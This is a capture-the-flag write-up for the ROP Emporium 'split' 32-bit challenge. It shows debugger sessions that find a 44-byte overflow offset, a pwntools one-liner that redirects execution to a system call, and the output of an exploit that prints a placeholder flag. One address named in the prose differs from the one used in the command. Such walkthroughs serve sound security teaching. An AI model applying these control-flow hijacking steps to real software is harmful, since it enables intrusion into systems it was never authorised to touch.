# Split

Challenge: https://ropemporium.com/challenge/split.html


### Run the binary

```bash
root@localhost:~/rop/split# ./split32
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> AAAAAAAAAA
Thank you!

Exiting
```

Let's pass in a bigger input to it.

```
root@localhost:~/rop/split# python3 -c "print('A'*64)" | ./split32
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
Segmentation fault (core dumped)
root@localhost:~/rop/split#
```

Cool! Looks like there's a buffer overflow which we can take advantage of.


### Initial Analysis

Notice how the value of the `eip` register (in the output down below) is coming from input string. We can set the `eip` to arbitrary value and take control of the program flow 😈.

```cpp
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb
$ebx   : 0xf7face34  →  ",\r#"
$ecx   : 0xf7fae8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffd390  →  "AAAAAAAAAAAAAAAA\n"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x08048630  →  <__libc_csu_init+0000> push ebp
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd390│+0x0000: "AAAAAAAAAAAAAAAA\n"	 ← $esp
0xffffd394│+0x0004: "AAAAAAAAAAAA\n"
0xffffd398│+0x0008: "AAAAAAAA\n"
0xffffd39c│+0x000c: "AAAA\n"
0xffffd3a0│+0x0010: 0x0000000a ("\n"?)
0xffffd3a4│+0x0014: 0x00000000
0xffffd3a8│+0x0018: 0xf7dba13d  →   add ebx, 0x1f2cf7
0xffffd3ac│+0x001c: 0xf7da0cb9  →   add esp, 0x10
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split32", stopped 0x41414141 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Let's try to find the offset the program crashed at. The `gef` extension comes with a utility that allows us to create a cyclic pattern of a specified length.
We can generate one with `pattern create <length>` and then use the generated string as input.

```cpp
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /root/rop/split/split32
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

After the program segfaults, we can use `pattern offset $eip` to find the offset.

```cpp
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb
$ebx   : 0xf7face34  →  ",\r#"
$ecx   : 0xf7fae8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffd390  →  0x6161616d ("maaa"?)
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x08048630  →  <__libc_csu_init+0000> push ebp
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd390│+0x0000: 0x6161616d	 ← $esp
0xffffd394│+0x0004: 0x6161616e
0xffffd398│+0x0008: 0x6161616f
0xffffd39c│+0x000c: 0x61616170
0xffffd3a0│+0x0010: 0x61616171
0xffffd3a4│+0x0014: 0x61616172
0xffffd3a8│+0x0018: 0x61616173
0xffffd3ac│+0x001c: 0x61616174
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split32", stopped 0x6161616c in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $eip
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
gef➤
```

There's our offset. The `eip` register gets clobbered, if the value of the input is more than 44 bytes. Knowing this offset is allows us to craft the payload that we want to pass to the binary.


### Walkthrough

Let's run `checksec` against this binary to see its properties and security options.

```bash
root@localhost:~/rop/split# checksec --file=split32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols	  No	0		3		split32

```

Since `NX` is enabled, we would not be able to execute a shellcode off of the stack.
More info at: https://en.wikipedia.org/wiki/NX_bit

That's not the end of the world. Let's run it under gdb to see what's available to us.

```cpp
root@localhost:~/rop/split# gdb -q ./split32
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 15.0.50.20240403-git in 0.00ms using Python engine 3.12
Reading symbols from ./split32...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ./split32)
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804860c  usefulFunction
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini
gef➤

```

At a first glance, the `usefulFunction` seems particularly interesting.
Upon disassembling usefulFunction, we notice that there's a call to `system` with a string argument at `0x804870e`.

```cpp
gef➤  disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804860c <+0>:	push   ebp
   0x0804860d <+1>:	mov    ebp,esp
   0x0804860f <+3>:	sub    esp,0x8
   0x08048612 <+6>:	sub    esp,0xc
   0x08048615 <+9>:	push   0x804870e
   0x0804861a <+14>:	call   0x80483e0 <system@plt>
   0x0804861f <+19>:	add    esp,0x10
   0x08048622 <+22>:	nop
   0x08048623 <+23>:	leave
   0x08048624 <+24>:	ret
End of assembler dump.
gef➤  x/s 0x804870e
0x804870e:	"/bin/ls"
gef➤

```
We can inspect the value at `0x804870e`. It looks like the value is `/bin/ls`.

This basically means that `system` is being called to run `/bin/ls`.
So if we can overflow the stack and change the value in `eip` to `0x0804861a`, we should see a directory listing. Let's do that.

```bash
root@localhost:~/rop/split# python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*44+p32(0x0804860c))' | ./split32
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
exploit2.py  exploit.py  flag.txt  payload  README.md  split32	split32.zip
Segmentation fault (core dumped)

```

Yay! There's the directory listing!

OK, what if we replace the argument of system to "cat flag.txt"? In theory, it would print the flag we are looking for :D
Let's check if we have the string "/bin/cat" somewhere in the binary. We can find this using gdb.

Re-run the binary under gdb and set a break point at main.

```cpp
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048550 <main+000a>      push   ebp
    0x8048551 <main+000b>      mov    ebp, esp
    0x8048553 <main+000d>      push   ecx
●→  0x8048554 <main+000e>      sub    esp, 0x4
    0x8048557 <main+0011>      mov    eax, ds:0x804a044
    0x804855c <main+0016>      push   0x0
    0x804855e <main+0018>      push   0x2
    0x8048560 <main+001a>      push   0x0
    0x8048562 <main+001c>      push   eax
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split32", stopped 0x8048554 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048554 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  grep "/bin/cat"
[+] Searching '/bin/cat' in memory
[+] In '/root/rop/split/split32'(0x804a000-0x804b000), permission=rw-
  0x804a030 - 0x804a041  →   "/bin/cat flag.txt"
gef➤
```


The exact string is present in the binary at address `0x804a030`. How very convenient!
We can see this in the output of `objdump` as well.

```bash
root@localhost:~/rop/split# objdump -M intel -s  --section .data split32

split32:     file format elf32-i386

Contents of section .data:
 804a028 00000000 00000000 2f62696e 2f636174  ......../bin/cat
 804a038 20666c61 672e7478 7400                flag.txt.
```

Alright, at this point we are all set to write our exploit.


```bash
root@localhost:~/rop/split# ./exploit.py
[+] Starting local process './split32': pid 76174
[*] Switching to interactive mode
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

There's the flag (⌐■_■)

